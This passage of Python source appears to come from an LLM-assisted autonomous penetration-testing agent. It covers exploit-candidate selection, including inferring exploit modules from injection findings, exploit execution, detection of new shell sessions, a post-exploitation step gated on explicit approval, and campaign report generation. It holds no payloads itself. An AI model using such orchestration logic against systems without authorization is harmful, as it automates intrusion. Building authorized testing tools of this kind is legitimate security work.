            if isinstance(max_req, int) and max_req > 0 and len(selected_results) > max_req:
                selected_results = selected_results[:max_req]

            if execution_plan.get("skip_exploitation"):
                exploit_paths = [r for r in selected_results if r.get("exploit_module")]
                if not exploit_paths:
                    print_info("Execution plan requested exploit skip (no exploitable paths).")
                    selected_results = []

            rationale = state.llm_plan.get("rationale")
            if rationale:
                rationale_label = "LLM" if decision_source == "llm_local" else "Plan"
                print_info(f"{rationale_label} rationale: {rationale}")

            selected_results = [
                r for r in selected_results
                if str(r.get("decision_class", self._finding_decision_class(r))) == "exploit"
            ]
            # Soft targets: promote inferred exploit modules from injection findings
            # when the plan has no direct exploit_module links yet.
            if not selected_results and not explicit_exploit_paths and self._has_weaponizable_campaign_pressure(state):
                inferred = self._derive_exploit_paths_from_findings(
                    followup_candidates or state.contextual_findings or state.vulnerable_results or [],
                    state.knowledge_base if isinstance(state.knowledge_base, dict) else {},
                    limit=4,
                )
                for path in inferred:
                    if path and path not in explicit_exploit_paths:
                        explicit_exploit_paths.append(path)

            self._append_timeline_event(
                state,
                "exploit",
                (
                    f"Execution stage prepared {len(selected_results)} exploit candidate(s), "
                    f"{len(followup_candidates)} follow-up candidate(s), "
                    f"{len(info_candidates)} informational candidate(s)."
                ),
                kind="execution",
                results=selected_results or followup_candidates or info_candidates,
            )

            if selected_results or explicit_exploit_paths:
                self._execute_exploit_results_with_options(
                    selected_results,
                    state.target_info,
                    state=state,
                    exploit_option_overrides=exploit_options,
                    explicit_exploit_paths=explicit_exploit_paths,
                    verbose=bool(state.verbose),
                )
            else:
                print_info(
                    "No exploitable module selected by execution plan "
                    "(no validated exploits/... path or exploit_module link)."
                )
        elif state.no_exploit:
            print_info("Exploitation skipped (--no-exploit).")

        sessions_before = state.sessions_before
        current_standard_sessions = set(self.framework.session_manager.sessions.keys())
        current_browser_sessions = set(self.framework.session_manager.browser_sessions.keys())
        new_standard = sorted(current_standard_sessions - sessions_before["standard"])
        new_browser = sorted(current_browser_sessions - sessions_before["browser"])
        new_sessions = new_standard + new_browser
        state.new_sessions = new_sessions

        if new_sessions:
            print_success("Got shell")
            policy = getattr(state, "runtime_policy", None)
            if policy is not None and getattr(policy, "approve_post_exploit", False):
                self._post_exploitation_loop(state)
            else:
                print_info(
                    "Post-exploitation not started: explicit --approve-post-exploit is required."
                )
        else:
            print_warning("No new shell/session detected")
        self._append_timeline_event(
            state,
            "exploit",
            f"Execution finished with {len(new_sessions)} new session(s).",
            kind="execution",
            extra={"new_sessions": list(new_sessions)},
        )
        state.replan_pending = self._should_replan_after_exploit(state)
        return state

    def _node_report(self, state: AgentState) -> AgentState:
        state.metrics.deterministic_steps += 1
        print_status("Generating report...")
        self._append_timeline_event(
            state,
            "report",
            "Generating Markdown and JSON campaign reports.",
            kind="report",
        )
        sync_metrics_from_budget(state)
        if isinstance(state.knowledge_base, dict):
            try:
                state.knowledge_base["module_memory_summary"] = {
                    "performance": self._module_perf.export_summary(),
                    "context": self._module_ctx.export_summary(),
                    "health": self._module_health.export_summary(),
                    "target_profile": classify_target_profile(state.knowledge_base),
                    "operational_context": classify_operational_context(state.knowledge_base),
                }
            except Exception:
                pass
        state.report_path = self._report.generate_report(
            state.raw_target,
            state.target_info,
            state.results,
            state.sql_findings,
            state.new_sessions,
            state.llm_plan,
            state.knowledge_base,
            state.execution_plan,
            state.contextual_findings,
            state.decision_timeline,
            run_id=state.run_id,
            workspace=state.workspace,
            metrics=state.metrics.__dict__,
            campaign_stop_reason=state.campaign_stop_reason,
            network_budget=sync_metrics_from_budget(state),
            runtime_policy={
                "safety_profile": state.safety_profile,
                "dry_run": state.dry_run,
                "plan_only": state.plan_only,
                "tls_verify": bool(
                    getattr(getattr(state, "runtime_policy", None), "tls_verify", True)
                ),
                "mission_profile": str(
                    getattr(getattr(state, "runtime_policy", None), "mission_profile", "") or ""
                ),
                "approved_risks": sorted(
                    str(value)
                    for value in (
                        getattr(getattr(state, "runtime_policy", None), "approved_risks", set())
                        or set()
                    )
                ),
                "session_policy": state.session_policy,
                "random_seed": state.random_seed,
            },
            decision_source=state.decision_source,
        )
        self._report.update_history_scores(
            state.contextual_findings,
            state.new_sessions,
            (state.knowledge_base or {}).get("session_provenance", {}),
        )
        self._update_host_profile_cache(state)
        self._print_timeline_preview(state)
        return state

    def _print_scoreboard(self, state: AgentState) -> None:
        metrics = state.metrics
        deterministic_steps = int(metrics.deterministic_steps)
        llm_calls = int(metrics.llm_calls)
        llm_fallback_count = int(metrics.llm_fallback_count)
        total = deterministic_steps + llm_calls
        det_ratio = 100.0 if total == 0 else (deterministic_steps / total) * 100.0
        llm_ratio = 0.0 if total == 0 else (llm_calls / total) * 100.0

        print_info("Agent Decision Scoreboard:")
        print_info(f"- deterministic_steps: {deterministic_steps}")
        print_info(f"- llm_calls: {llm_calls}")
        print_info(f"- llm_fallback_count: {llm_fallback_count}")
        print_info(f"- network_units_used: {int(getattr(metrics, 'network_units_used', 0) or 0)}")
        print_info(f"- network_units_skipped: {int(getattr(metrics, 'network_units_skipped', 0) or 0)}")
        print_info(f"- deterministic_ratio: {det_ratio:.1f}%")
        print_info(f"- llm_ratio: {llm_ratio:.1f}%")
